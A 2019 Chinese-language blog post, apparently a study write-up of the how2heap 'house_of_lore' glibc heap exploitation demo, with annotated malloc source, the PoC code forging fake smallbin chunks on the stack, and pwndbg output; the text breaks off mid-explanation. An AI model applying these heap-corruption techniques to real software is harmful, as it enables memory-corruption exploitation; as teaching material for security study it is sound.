<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="how2heap-3"><meta name="keywords" content="pwn"><meta name="author" content="QRZ"><meta name="copyright" content="QRZ"><title>how2heap-3 | QRZ's Blog</title><link rel="shortcut icon" href="https://raw.githubusercontent.com/40m41h42t/Images/master/2019/09/IMG_20190923_132425.png"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js"></script><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script><link rel="dns-prefetch" href="https://hm.baidu.com"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?ff97cec996f09596dd444ef4dd5c925d";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();</script><link rel="dns-prefetch" href="https://www.google-analytics.com"><script>(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-131763109-1', 'auto');
ga('send', 'pageview');</script><link rel="dns-prefetch" href="http://ta.qq.com"><script>(function() {
   var hm = document.createElement("script");
   hm.src = "https://tajs.qq.com/stats?sId=62826431";
   var s = document.getElementsByTagName("script")[0];
   s.parentNode.insertBefore(hm, s);
 })();</script><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶é”™è¯¯',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  hexoVersion: '5.2.0'
} </script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="QRZ's Blog" type="application/atom+xml">
</head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="åˆ‡æ¢æ–‡ç« è¯¦æƒ…">åˆ‡æ¢ç«™ç‚¹æ¦‚è§ˆ</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">ç›®å½•</div><div class="sidebar-toc__progress"><span class="progress-notice">ä½ å·²ç»è¯»äº†</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#how2heap-3"><span class="toc-text">how2heap-3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-lore"><span class="toc-text">house_of_lore</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA"><span class="toc-text">è¾“å‡º</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A"><span class="toc-text">è§£é‡Š</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#overlapping-chunks"><span class="toc-text">overlapping_chunks</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA-1"><span class="toc-text">è¾“å‡º</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A-1"><span class="toc-text">è§£é‡Š</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#overlanpping-chunks-2"><span class="toc-text">overlanpping_chunks_2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A-2"><span class="toc-text">è§£é‡Š</span></a></li></ol></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://raw.githubusercontent.com/40m41h42t/Images/master/2019/09/IMG_20190923_132425.png"></div><div class="author-info__name text-center">QRZ</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">æ–‡ç« </span><span class="pull-right">34</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">æ ‡ç­¾</span><span class="pull-right">14</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">åˆ†ç±»</span><span class="pull-right">7</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://raw.githubusercontent.com/40m41h42t/Images/master/2019/09/866283.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">QRZ's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" target="_blank" rel="noopener" href="https://wiki.qrzbing.cn">Wiki</a><a class="site-page" href="/about">About</a><a class="site-page" href="/music">Music</a><a class="site-page" href="/friends">Friends</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">how2heap-3</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-07-09</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="how2heap-3"><a href="#how2heap-3" class="headerlink" title="how2heap-3"></a>how2heap-3</h1><a id="more"></a>

<h2 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house_of_lore"></a>house_of_lore</h2><h3 id="è¾“å‡º"><a href="#è¾“å‡º" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;glibc_2.25&#x2F;house_of_lore </span><br><span class="line"></span><br><span class="line">Welcome to the House of Lore</span><br><span class="line">This is a revisited version that bypass also the hardening check introduced by glibc malloc</span><br><span class="line">This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23</span><br><span class="line"></span><br><span class="line">Allocating the victim chunk</span><br><span class="line">Allocated the first small chunk on the heap at 0x603010</span><br><span class="line">stack_buffer_1 at 0x7fffffffdcc0</span><br><span class="line">stack_buffer_2 at 0x7fffffffdca0</span><br><span class="line">Create a fake chunk on the stack</span><br><span class="line">Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corruptedin second to the last malloc, which putting stack address on smallbin list</span><br><span class="line">Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake chunk on stackAllocating another large chunk in order to avoid consolidating the top chunk withthe small one during the free()</span><br><span class="line">Allocated the large chunk on the heap at 0x603080</span><br><span class="line">Freeing the chunk 0x603010, it will be inserted in the unsorted bin</span><br><span class="line"></span><br><span class="line">In the unsorted bin the victim&#39;s fwd and bk pointers are nil</span><br><span class="line">victim-&gt;fwd: (nil)</span><br><span class="line">victim-&gt;bk: (nil)</span><br><span class="line"></span><br><span class="line">Now performing a malloc that can&#39;t be handled by the UnsortedBin, nor the small bin</span><br><span class="line">This means that the chunk 0x603010 will be inserted in front of the SmallBin</span><br><span class="line">The chunk that can&#39;t be handled by the unsorted bin, nor the SmallBin has been allocated to 0x603470</span><br><span class="line">The victim chunk has been sorted and its fwd and bk pointers updated</span><br><span class="line">victim-&gt;fwd: 0x7ffff7dd1bd8</span><br><span class="line">victim-&gt;bk: 0x7ffff7dd1bd8</span><br><span class="line"></span><br><span class="line">Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer</span><br><span class="line">Now allocating a chunk with size equal to the first one freed</span><br><span class="line">This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer</span><br><span class="line">This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk</span><br><span class="line">p4 &#x3D; malloc(100)</span><br><span class="line"></span><br><span class="line">The fwd pointer of stack_buffer_2 has changed after the last malloc to 0x7ffff7dd1bd8</span><br><span class="line"></span><br><span class="line">p4 is 0x7fffffffdcd0 and should be on the stack!</span><br><span class="line">Nice jump d00d</span><br></pre></td></tr></table></figure>

<h3 id="è§£é‡Š"><a href="#è§£é‡Š" class="headerlink" title="è§£é‡Š"></a>è§£é‡Š</h3><blockquote>
<p>house of lore æŠ€æœ¯ä¸»è¦æ˜¯ç”¨æ¥ä¼ªé€ ä¸€ä¸ª small bin é“¾ã€‚</p>
</blockquote>
<blockquote>
<ul>
<li>House of Lore æ”»å‡»ä¸ Glibc å †ç®¡ç†ä¸­çš„çš„ Small Bin çš„æœºåˆ¶ç´§å¯†ç›¸å…³ã€‚</li>
<li>House of Lore å¯ä»¥å®ç°åˆ†é…ä»»æ„æŒ‡å®šä½ç½®çš„ chunkï¼Œä»è€Œä¿®æ”¹ä»»æ„åœ°å€çš„å†…å­˜ã€‚</li>
<li>House of Lore åˆ©ç”¨çš„å‰ææ˜¯éœ€è¦æ§åˆ¶ Small Bin Chunk çš„ bk æŒ‡é’ˆï¼Œå¹¶ä¸”æ§åˆ¶æŒ‡å®šä½ç½® chunk çš„ fd æŒ‡é’ˆã€‚</li>
</ul>
</blockquote>
<p>å¦‚æœåœ¨ malloc çš„æ—¶å€™ï¼Œç”³è¯·çš„å†…å­˜å—åœ¨ small bin èŒƒå›´å†…ï¼Œé‚£ä¹ˆæ‰§è¡Œçš„æµç¨‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">       If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">       hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">       (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">       processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">       anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range(nb)) &#123;</span><br><span class="line">        <span class="comment">// è·å– small bin çš„ç´¢å¼•</span></span><br><span class="line">        idx = smallbin_index(nb);</span><br><span class="line">        <span class="comment">// è·å–å¯¹åº” small bin ä¸­çš„ chunk æŒ‡é’ˆ</span></span><br><span class="line">        bin = bin_at(av, idx);</span><br><span class="line">        <span class="comment">// å…ˆæ‰§è¡Œ victim= last(bin)ï¼Œè·å– small bin çš„æœ€åä¸€ä¸ª chunk</span></span><br><span class="line">        <span class="comment">// å¦‚æœ victim = bin ï¼Œé‚£è¯´æ˜è¯¥ bin ä¸ºç©ºã€‚</span></span><br><span class="line">        <span class="comment">// å¦‚æœä¸ç›¸ç­‰ï¼Œé‚£ä¹ˆä¼šæœ‰ä¸¤ç§æƒ…å†µ</span></span><br><span class="line">        <span class="keyword">if</span> ((victim = last(bin)) != bin) &#123;</span><br><span class="line">            <span class="comment">// ç¬¬ä¸€ç§æƒ…å†µï¼Œsmall bin è¿˜æ²¡æœ‰åˆå§‹åŒ–ã€‚</span></span><br><span class="line">            <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">                <span class="comment">// æ‰§è¡Œåˆå§‹åŒ–ï¼Œå°† fast bins ä¸­çš„ chunk è¿›è¡Œåˆå¹¶</span></span><br><span class="line">                malloc_consolidate(av);</span><br><span class="line">            <span class="comment">// ç¬¬äºŒç§æƒ…å†µï¼Œsmall bin ä¸­å­˜åœ¨ç©ºé—²çš„ chunk</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// è·å– small bin ä¸­å€’æ•°ç¬¬äºŒä¸ª chunk ã€‚</span></span><br><span class="line">                bck = victim-&gt;bk;</span><br><span class="line">                <span class="comment">// æ£€æŸ¥ bck-&gt;fd æ˜¯ä¸æ˜¯ victimï¼Œé˜²æ­¢ä¼ªé€ </span></span><br><span class="line">                <span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">                    errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                    <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// è®¾ç½® victim å¯¹åº”çš„ inuse ä½</span></span><br><span class="line">                set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">                <span class="comment">// ä¿®æ”¹ small bin é“¾è¡¨ï¼Œå°† small bin çš„æœ€åä¸€ä¸ª chunk å–å‡ºæ¥</span></span><br><span class="line">                bin-&gt;bk = bck;</span><br><span class="line">                bck-&gt;fd = bin;</span><br><span class="line">                <span class="comment">// å¦‚æœä¸æ˜¯ main_arenaï¼Œè®¾ç½®å¯¹åº”çš„æ ‡å¿—</span></span><br><span class="line">                <span class="keyword">if</span> (av != &amp;main_arena) set_non_main_arena(victim);</span><br><span class="line">                <span class="comment">// ç»†è‡´çš„æ£€æŸ¥</span></span><br><span class="line">                check_malloced_chunk(av, victim, nb);</span><br><span class="line">                <span class="comment">// å°†ç”³è¯·åˆ°çš„ chunk è½¬åŒ–ä¸ºå¯¹åº”çš„ mem çŠ¶æ€</span></span><br><span class="line">                <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">                <span class="comment">// å¦‚æœè®¾ç½®äº† perturb_type , åˆ™å°†è·å–åˆ°çš„chunkåˆå§‹åŒ–ä¸º perturb_type ^ 0xff</span></span><br><span class="line">                alloc_perturb(p, bytes);</span><br><span class="line">                <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ä»ä¸‹é¢çš„è¿™éƒ¨åˆ†æˆ‘ä»¬å¯ä»¥çœ‹å‡º</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// è·å– small bin ä¸­å€’æ•°ç¬¬äºŒä¸ª chunk ã€‚</span></span><br><span class="line">bck = victim-&gt;bk;</span><br><span class="line"><span class="comment">// æ£€æŸ¥ bck-&gt;fd æ˜¯ä¸æ˜¯ victimï¼Œé˜²æ­¢ä¼ªé€ </span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è®¾ç½® victim å¯¹åº”çš„ inuse ä½</span></span><br><span class="line">set_inuse_bit_at_offset(victim, nb);</span><br><span class="line"><span class="comment">// ä¿®æ”¹ small bin é“¾è¡¨ï¼Œå°† small bin çš„æœ€åä¸€ä¸ª chunk å–å‡ºæ¥</span></span><br><span class="line">bin-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = bin;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæˆ‘ä»¬å¯ä»¥ä¿®æ”¹ small bin çš„æœ€åä¸€ä¸ª chunk çš„ bk ä¸ºæˆ‘ä»¬æŒ‡å®šå†…å­˜åœ°å€çš„ fake chunkï¼Œå¹¶ä¸”åŒæ—¶æ»¡è¶³ä¹‹åçš„ bck-&gt;fd != victim çš„æ£€æµ‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿å¾— small bin çš„ bk æ°å¥½ä¸ºæˆ‘ä»¬æ„é€ çš„ fake chunkã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“ä¸‹ä¸€æ¬¡ç”³è¯· small bin çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±ä¼šåˆ†é…åˆ°æŒ‡å®šä½ç½®çš„ fake chunkã€‚</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nWelcome to the House of Lore\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line"><span class="keyword">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line"><span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line"><span class="keyword">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="keyword">void</span>*)stack_buffer_1);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="keyword">void</span>*)stack_buffer_2);</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆåœ¨æ ˆä¸Šåˆ†é…ä¸¤ä¸ªæ•°ç»„ï¼Œç„¶ååˆ†é… victim chunkã€‚è¿™æ—¶ heap ä¸Šçš„ç¬¬ä¸€ä¸ª small chunkã€‚</p>
<p><code>victim_chunk = victim - 2</code>: <code>victim - WORD_SIZE</code> å› ä¸ºæˆ‘ä»¬éœ€è¦å‡å»é¦–éƒ¨ä»¥è·å– chunk çš„ç»å¯¹åœ°å€ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p victim</span><br><span class="line">$3 &#x3D; (intptr_t *) 0x603010</span><br><span class="line">pwndbg&gt; p victim_chunk </span><br><span class="line">$4 &#x3D; (intptr_t *) 0x603000</span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">0x603000 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 113, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x603070 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 135057, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥åœ¨æ ˆä¸Šä¼ªé€ ä¸¤ä¸ª chunkï¼š</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake chunk on the stack\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span></span><br><span class="line">       <span class="string">&quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;</span>);</span><br><span class="line">stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;</span></span><br><span class="line">       <span class="string">&quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span></span><br><span class="line">       <span class="string">&quot;chunk on stack&quot;</span>);</span><br><span class="line">stack_buffer_1[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">stack_buffer_2[<span class="number">2</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_1;</span><br></pre></td></tr></table></figure>

<p>å¯¹äºç¬¬ä¸€å— chunkï¼Œfwd æŒ‡é’ˆæŒ‡å‘ victim_chunk ä»¥ç»•è¿‡æ£€æŸ¥ã€‚åœ¨æœ€å malloc æ—¶ï¼Œè¿™ä¸€å—ä¼šè¢«æ”¾åœ¨ smallbin list ä¸­ã€‚è®¾ç½® bk æŒ‡é’ˆæŒ‡å‘ stack_buffer_2ï¼Œæ¥ä¸‹æ¥è®¾ç½® stack_buffer_2 çš„ fwd æŒ‡é’ˆæŒ‡å‘ stack_buffer_1 ä»¥ç»•è¿‡ malloc æ—¶é’ˆå¯¹ small bin çš„æ£€æŸ¥ï¼Œè¿™å›è¿”å›æ ˆä¸Š fake chunk çš„æŒ‡é’ˆã€‚è¿™æ ·å°±æ„é€ äº†ä¸€ä¸ª small bin é“¾ã€‚</p>
<p>check çš„æ£€æµ‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Advanced exploitation of the House of Lore - Malloc Maleficarum.</span></span><br><span class="line"><span class="comment">// This PoC take care also of the glibc hardening of smallbin corruption.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// [ ... ]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      bck = victim-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span><br><span class="line"></span><br><span class="line">                  errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                  <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">       set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">       bin-&gt;bk = bck;</span><br><span class="line">       bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line"><span class="comment">//       [ ... ]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä¼ªé€ åçš„ç»“æ„å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p stack_buffer_1</span><br><span class="line">$8 &#x3D; &#123;0x0, 0x0, 0x603000, 0x7fffffffdc50&#125;</span><br><span class="line">pwndbg&gt; p stack_buffer_2</span><br><span class="line">$9 &#x3D; &#123;0x0, 0x0, 0x7fffffffdc70&#125;</span><br><span class="line">pwndbg&gt; p &amp;stack_buffer_1</span><br><span class="line">$10 &#x3D; (intptr_t *(*)[4]) 0x7fffffffdc70</span><br><span class="line">pwndbg&gt; p &amp;stack_buffer_2</span><br><span class="line">$11 &#x3D; (intptr_t *(*)[3]) 0x7fffffffdc50</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥ç”³è¯·ä¸€å¤§å—å†…å­˜</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">       <span class="string">&quot;the small one during the free()\n&quot;</span>);</span><br><span class="line"><span class="keyword">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);</span><br></pre></td></tr></table></figure>

<p>ç”³è¯·è¿™å—å†…å­˜çš„ç›®çš„æ˜¯åœ¨ä¹‹åçš„ free ä¸­é¿å… victim chunk è¢«åˆå¹¶è¿› top chunk ä¸­ã€‚</p>
<p>ç„¶åé‡Šæ”¾ victim chunkã€‚</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line"><span class="built_in">free</span>((<span class="keyword">void</span>*)victim);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are nil\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>

<p>å®ƒæœ¬åº”è¯¥è¢«æ”¾å…¥ unsorted bin ä¸­çš„ï¼ˆæˆ‘è¿™é‡Œæ”¾å…¥äº† fastbinsï¼‰</p>
<p>åœ¨ unsorted bin ä¸­ victim çš„ fwd å’Œ bk æŒ‡é’ˆéƒ½ä¸ºç©ºã€‚</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥ malloc ä¸€å—å¤§ chunkï¼Œå¤§åˆ°ä¸èƒ½åœ¨ UnsortedBin ä¸­æ‰¾åˆ°åˆé€‚çš„å°±å¯ä»¥äº†ã€‚è¿™æ · victim ä¼šè¢«æ•´ç†åˆ° smallbins ä¸­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0x70: 0x603000 â€”â–¸ 0x7ffff7dd1bd8 (main_arena+184) â—‚â€” 0x603000</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<p>å—¯ï¼Œè™½ç„¶æˆ‘è¿™é‡Œçš„ victim ä¹‹å‰åœ¨ fastbins ä¸­ï¼Œä½†æ˜¯åœ¨è¿™ä¹‹åä»ç„¶è¢«æ•´ç†åˆ°äº† smallbins ä¸­ã€‚å¯ä»¥è¯»æºç çœ‹çœ‹å¯¹ unsortedbin å’Œ fastbins çš„æ“ä½œéƒ½æœ‰ä»€ä¹ˆã€‚</p>
<p>æ­¤æ—¶ victim chunk çš„ fwd å’Œ bk æŒ‡é’ˆéƒ½è¢«æ›´æ–°äº†ï¼š</p>
